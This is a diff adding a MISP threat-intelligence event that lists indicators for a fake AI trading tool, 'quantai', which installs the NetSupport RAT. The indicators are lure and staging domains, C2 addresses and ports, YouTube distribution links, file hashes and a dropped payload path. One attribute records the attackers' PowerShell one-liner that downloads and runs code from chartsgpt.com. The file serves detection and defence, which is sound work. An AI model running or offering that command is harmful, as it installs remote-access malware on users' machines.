@@ -1,0 +1,638 @@
+{
+  "Event": {
+    "uuid": "8d89fd21-c06e-5113-9e98-4be98db423c3",
+    "info": "quantai, a fake AI trading tool installing a NetSupport RAT",
+    "date": "2026-11-09",
+    "threat_level_id": "2",
+    "analysis": "2",
+    "distribution": "3",
+    "published": false,
+    "timestamp": "1794182400",
+    "Orgc": {
+      "uuid": "b641827b-b56f-53c3-b356-359fddd6e73f",
+      "name": "Harper Johns"
+    },
+    "Tag": [
+      {
+        "name": "tlp:clear"
+      },
+      {
+        "name": "misp-galaxy:malpedia=\"NetSupportManager RAT\""
+      }
+    ],
+    "Attribute": [
+      {
+        "uuid": "3921bf56-a4fb-5341-a816-2d80d4e412aa",
+        "type": "domain",
+        "category": "Network activity",
+        "value": "quantai.io",
+        "to_ids": true,
+        "distribution": "5",
+        "comment": "lure [type: domain; verdict: malicious; source: Wayback Machine]",
+        "timestamp": "1794182400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-09-11T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "9cfc1579-9ce5-5beb-a20a-ca0d4cc2b264",
+        "type": "domain",
+        "category": "Network activity",
+        "value": "quantai.net",
+        "to_ids": true,
+        "distribution": "5",
+        "comment": "lure [type: domain; verdict: malicious; source: urlscan.io]",
+        "timestamp": "1794182400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-10-26T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "bde288f3-2bbb-5051-8e5e-207f5146ee9b",
+        "type": "domain",
+        "category": "Network activity",
+        "value": "quant-pro.com",
+        "to_ids": true,
+        "distribution": "5",
+        "comment": "lure [type: domain; verdict: malicious; source: analyst triage]",
+        "timestamp": "1794182400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-11-09T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "70256dd8-1aaf-5200-a7f9-f9ae083ccdf1",
+        "type": "domain",
+        "category": "Network activity",
+        "value": "quantai.app",
+        "to_ids": true,
+        "distribution": "5",
+        "comment": "lure [type: domain; verdict: malicious; source: Wayback Machine; analyst triage]",
+        "timestamp": "1794182400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-04-21T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "43b05600-0dd5-5e24-bcae-f311e94d9726",
+        "type": "domain",
+        "category": "Network activity",
+        "value": "quant-pro.ai",
+        "to_ids": false,
+        "distribution": "5",
+        "comment": "lure [type: domain; verdict: candidate; source: analyst triage]",
+        "timestamp": "1794182400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"low\""
+          }
+        ],
+        "first_seen": "2026-11-09T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "13f275e4-7e42-5883-9b53-1b58a7fa6ced",
+        "type": "domain",
+        "category": "Network activity",
+        "value": "chartsgpt.com",
+        "to_ids": true,
+        "distribution": "5",
+        "comment": "stage [type: domain; verdict: malicious; source: urlscan.io; RDAP]",
+        "timestamp": "1794182400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-10-26T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "50b5a353-52f2-5d0e-b902-301b43b42fe3",
+        "type": "url",
+        "category": "Network activity",
+        "value": "https://chartsgpt.com/quant.php?Dio=<COMPUTERNAME>",
+        "to_ids": true,
+        "distribution": "5",
+        "comment": "stage [type: url; verdict: malicious; source: urlscan.io; analyst triage]",
+        "timestamp": "1794182400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-10-30T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "c6a0e9b6-4b36-5781-bfe0-9b6464d18f2e",
+        "type": "url",
+        "category": "Network activity",
+        "value": "https://chartsgpt.com/ps.php",
+        "to_ids": true,
+        "distribution": "5",
+        "comment": "stage [type: url; verdict: malicious; source: analyst triage]",
+        "timestamp": "1794182400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-11-09T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "f54ff8bf-39f1-5367-a67b-4527918796e3",
+        "type": "url",
+        "category": "Network activity",
+        "value": "https://chartsgpt.com/ps2.php",
+        "to_ids": true,
+        "distribution": "5",
+        "comment": "stage [type: url; verdict: malicious; source: urlscan.io]",
+        "timestamp": "1794182400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-10-30T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "e2081f6f-18ea-53f7-a7d2-678d4740656a",
+        "type": "url",
+        "category": "Network activity",
+        "value": "https://chartsgpt.com/boka.7z",
+        "to_ids": true,
+        "distribution": "5",
+        "comment": "stage [type: url; verdict: malicious; source: analyst triage]",
+        "timestamp": "1794182400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-11-09T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "0bdca991-8537-5620-8149-07ac1b528f04",
+        "type": "url",
+        "category": "Network activity",
+        "value": "https://chartsgpt.com/smow.7z",
+        "to_ids": true,
+        "distribution": "5",
+        "comment": "stage [type: url; verdict: malicious; source: analyst triage]",
+        "timestamp": "1794182400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-11-09T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "e542eee4-303f-5303-84c0-8b4c6612def1",
+        "type": "url",
+        "category": "Network activity",
+        "value": "https://chartsgpt.com/vh.exe",
+        "to_ids": true,
+        "distribution": "5",
+        "comment": "stage [type: url; verdict: malicious; source: analyst triage]",
+        "timestamp": "1794182400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-11-09T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "89adefc2-d19e-5b7e-a6af-f0c12806f20c",
+        "type": "domain",
+        "category": "Network activity",
+        "value": "sonosarcsounds.com",
+        "to_ids": true,
+        "distribution": "5",
+        "comment": "c2 [type: domain; verdict: malicious; source: RDAP; config file]",
+        "timestamp": "1794182400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-06-15T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "78dd50a9-7666-58b8-9fcc-997c748023b0",
+        "type": "domain",
+        "category": "Network activity",
+        "value": "sonosarcsounds.net",
+        "to_ids": true,
+        "distribution": "5",
+        "comment": "c2 [type: domain; verdict: malicious; source: RDAP; config file]",
+        "timestamp": "1794182400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-06-15T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "8c80cb94-dd4f-58dd-b429-60bfbd04aae6",
+        "type": "ip-dst",
+        "category": "Network activity",
+        "value": "192.69.210.252",
+        "to_ids": true,
+        "distribution": "5",
+        "comment": "c2 [type: ipv4; verdict: malicious; source: Shodan]",
+        "timestamp": "1794182400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-11-01T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "ae61d8b2-fb29-5615-abf1-b26458efd280",
+        "type": "ip-dst|port",
+        "category": "Network activity",
+        "value": "192.69.210.252|2084",
+        "to_ids": true,
+        "distribution": "5",
+        "comment": "c2 [type: endpoint; verdict: malicious; source: config file]",
+        "timestamp": "1794182400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-11-09T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "a930aefa-2e34-5ec2-a357-1542d69679fe",
+        "type": "ip-dst|port",
+        "category": "Network activity",
+        "value": "192.69.210.252|1337",
+        "to_ids": true,
+        "distribution": "5",
+        "comment": "c2 [type: endpoint; verdict: malicious; source: Shodan]",
+        "timestamp": "1794182400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"moderate\""
+          }
+        ],
+        "first_seen": "2026-11-01T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "dd9c8c2b-a45e-5aec-9657-05d18a67657a",
+        "type": "url",
+        "category": "Social network",
+        "value": "https://www.youtube.com/channel/UCXB43fOyaJWD1o092fOF5Iw",
+        "to_ids": false,
+        "distribution": "5",
+        "comment": "distribution [type: youtube-channel; verdict: malicious; source: YouTube metadata]",
+        "timestamp": "1794182400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-11-05T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "9da1de72-225c-5fc6-8b24-af6d86dc159e",
+        "type": "url",
+        "category": "Social network",
+        "value": "https://www.youtube.com/watch?v=RKeu00DiDzw",
+        "to_ids": false,
+        "distribution": "5",
+        "comment": "distribution [type: youtube-video; verdict: malicious; source: YouTube metadata]",
+        "timestamp": "1794182400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-11-05T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "7b1835bb-a0b9-5e35-bec8-496a272daae8",
+        "type": "url",
+        "category": "Social network",
+        "value": "https://www.youtube.com/watch?v=D_b9HgmrS4Y",
+        "to_ids": false,
+        "distribution": "5",
+        "comment": "distribution [type: youtube-video; verdict: malicious; source: YouTube metadata]",
+        "timestamp": "1794182400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-11-05T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "cd7555ab-e9cb-578d-bdb0-782cdd1c02f2",
+        "type": "sha256",
+        "category": "Payload delivery",
+        "value": "52004733e5b056318cf87f33fe8039e8e3248f1a418b326f84c2a61ff52f7c23",
+        "to_ids": true,
+        "distribution": "5",
+        "comment": "lure-kit-asset(2.jpg) [type: sha256; verdict: malicious; source: urlscan.io; Wayback Machine]",
+        "timestamp": "1794182400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-09-11T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "eb60c372-84fd-5969-b8a5-429e3d12236a",
+        "type": "sha256",
+        "category": "Payload delivery",
+        "value": "d65aba2368a8bbb5eb9d55504d2fbffa5c1febf144f1124291d0d126e68ee313",
+        "to_ids": true,
+        "distribution": "5",
+        "comment": "lure-kit-asset(4.jpg) [type: sha256; verdict: malicious; source: urlscan.io]",
+        "timestamp": "1794182400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-10-28T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "19f07ca6-f803-5bae-9b29-7ff39c7c9b7a",
+        "type": "sha256",
+        "category": "Payload delivery",
+        "value": "985d31edfbf92f66fcd5934c7512173bf8a146f41b11009dd769325f777fa58e",
+        "to_ids": true,
+        "distribution": "5",
+        "comment": "lure-kit-asset(5.jpg) [type: sha256; verdict: malicious; source: urlscan.io]",
+        "timestamp": "1794182400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-10-28T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "9dbdcfe2-617f-5556-b53b-1402acd40dd4",
+        "type": "sha256",
+        "category": "Payload delivery",
+        "value": "675366f67703c32224abd7040063fd3ca53301ec99af0ae55ec9da58dbbfec9b",
+        "to_ids": true,
+        "distribution": "5",
+        "comment": "lure-kit-asset(favicon.ico quantai.net 648B) [type: sha256; verdict: malicious; source: urlscan.io]",
+        "timestamp": "1794182400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-10-26T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "4fe0da19-2c8c-57bc-8cab-7bd396098097",
+        "type": "sha256",
+        "category": "Payload delivery",
+        "value": "dc71c941eaf5aec28a7d7faa3acaf632fc26cee7b75559c175e43661827e1f9f",
+        "to_ids": true,
+        "distribution": "5",
+        "comment": "lure-kit-asset(favicon.ico quantai.io 3459B; shodan mmh3 -888936931) [type: sha256; verdict: malicious; source: Wayback Machine]",
+        "timestamp": "1794182400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-09-11T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "96ef12ec-198b-5593-99c0-4efa3f0b2880",
+        "type": "sha256",
+        "category": "Payload delivery",
+        "value": "7c40a7a42508dfe5f81ff77aa386bdf23d163625ef3c60749ff2e6db4869baf4",
+        "to_ids": true,
+        "distribution": "5",
+        "comment": "lure-kit-asset(styles.css quantai.io) [type: sha256; verdict: malicious; source: Wayback Machine]",
+        "timestamp": "1794182400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"moderate\""
+          }
+        ],
+        "first_seen": "2026-09-11T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "5a25df6c-2ac0-58b1-a03f-498c8fc22937",
+        "type": "sha256",
+        "category": "Payload delivery",
+        "value": "f1c5a19c45a7fda2e55e994f002dbeae6063efe974438689038d4e30c134610f",
+        "to_ids": true,
+        "distribution": "5",
+        "comment": "lure-kit-asset(styles.css quantai.net) [type: sha256; verdict: malicious; source: urlscan.io]",
+        "timestamp": "1794182400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"moderate\""
+          }
+        ],
+        "first_seen": "2026-10-28T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "351d7b2a-ed5e-5b4d-a0a3-8b9494eb8cb4",
+        "type": "text",
+        "category": "Other",
+        "value": "0x4AAAAAAEPGVgD_srJzXb7_",
+        "to_ids": false,
+        "distribution": "5",
+        "comment": "lure [type: turnstile-sitekey; verdict: malicious; source: page source]",
+        "timestamp": "1794182400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-09-11T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "6e41f113-5969-5903-b35f-d7b8be7310a0",
+        "type": "text",
+        "category": "Other",
+        "value": "0x4AAAAAAF0eiSwGvAzjJ92v",
+        "to_ids": false,
+        "distribution": "5",
+        "comment": "lure [type: turnstile-sitekey; verdict: malicious; source: page source]",
+        "timestamp": "1794182400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-10-26T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "2bb1f8cd-c13c-5192-9590-7eedb884cc6c",
+        "type": "text",
+        "category": "Other",
+        "value": "0x4AAAAAAFzmIWEaVA5Cq1V8",
+        "to_ids": false,
+        "distribution": "5",
+        "comment": "lure [type: turnstile-sitekey; verdict: malicious; source: page source]",
+        "timestamp": "1794182400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-11-09T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "a562f14e-a84d-5f95-afdd-d76ca3412701",
+        "type": "text",
+        "category": "Other",
+        "value": "0x4AAAAAADnC0ViZ3yjajUEI",
+        "to_ids": false,
+        "distribution": "5",
+        "comment": "lure [type: turnstile-sitekey; verdict: malicious; source: page source]",
+        "timestamp": "1794182400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-11-09T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "c11ae363-9a43-5580-9683-661f7a60ce1d",
+        "type": "text",
+        "category": "Other",
+        "value": "NSM1234",
+        "to_ids": false,
+        "distribution": "5",
+        "comment": "c2 [type: netsupport-licensee; verdict: malicious; source: licence file]",
+        "timestamp": "1794182400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"moderate\""
+          }
+        ],
+        "first_seen": "2026-08-25T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "df3ddbe2-081f-5339-9a2c-0b407ac5c7b9",
+        "type": "text",
+        "category": "Payload delivery",
+        "value": "DESKTOP-VIG3E9V",
+        "to_ids": false,
+        "distribution": "5",
+        "comment": "c2 [type: cert-cn; verdict: candidate; source: Shodan]",
+        "timestamp": "1794182400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"low\""
+          }
+        ],
+        "first_seen": "2026-10-02T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "233de94b-ba3e-513f-a59c-8e12623116bc",
+        "type": "text",
+        "category": "Payload delivery",
+        "value": "25:59:22:98:98:22:5a:af:4d:71:14:de:05:b0:88:78",
+        "to_ids": false,
+        "distribution": "5",
+        "comment": "c2 [type: cert-serial; verdict: candidate; source: Shodan]",
+        "timestamp": "1794182400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"low\""
+          }
+        ],
+        "first_seen": "2026-10-02T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "4d4d35f6-ceef-570e-ae0a-102f8c99bc63",
+        "type": "filename",
+        "category": "Artifacts dropped",
+        "value": "%LOCALAPPDATA%\\Stoservice\\stservice.exe",
+        "to_ids": false,
+        "distribution": "5",
+        "comment": "payload [type: path; verdict: malicious; source: analyst triage]",
+        "timestamp": "1794182400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-11-09T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "619f649d-c858-5f9c-bcbe-3eb067fdbf57",
+        "type": "text",
+        "category": "Payload delivery",
+        "value": "irm \"https://chartsgpt.com/quant.php?Dio=$($env:COMPUTERNAME)\" | iex",
+        "to_ids": false,
+        "distribution": "5",
+        "comment": "stage [type: command; verdict: malicious; source: analyst triage]",
+        "timestamp": "1794182400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-11-09T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "ecfa9f90-6de3-51d1-9cb4-73eaf450cdc7",
+        "type": "ip-dst",
+        "category": "Network activity",
+        "value": "45.91.202.58",
+        "to_ids": true,
+        "distribution": "5",
+        "comment": "c2 [type: ipv4; verdict: malicious; source: DNS resolution; check-host.net]",
+        "timestamp": "1794182400",
+        "Tag": [
+          {
+            "name": "estimative-language:confidence-in-analytic-judgment=\"high\""
+          }
+        ],
+        "first_seen": "2026-11-10T00:00:00.000000+00:00"
+      },
+      {
+        "uuid": "7ed9e7fa-c6e6-5499-8607-0fad944a50c4",
+        "type": "link",
+        "category": "External analysis",
+        "value": "https://youtu.be/FjaMrGFCiHs",
+        "to_ids": false,
+        "distribution": "5",
+        "comment": "YouTube",
+        "timestamp": "1794182400"
+      },
+      {
+        "uuid": "373d7611-4953-5b66-b8c1-0931ec5e1640",
+        "type": "link",
+        "category": "External analysis",
+        "value": "https://gist.github.com/harperjohnsai/2353a13490642a9dbb77e42823ad6eef",
+        "to_ids": false,
+        "distribution": "5",
+        "comment": "GitHub Gist",
+        "timestamp": "1794182400"
+      }
+    ]
+  }
+}
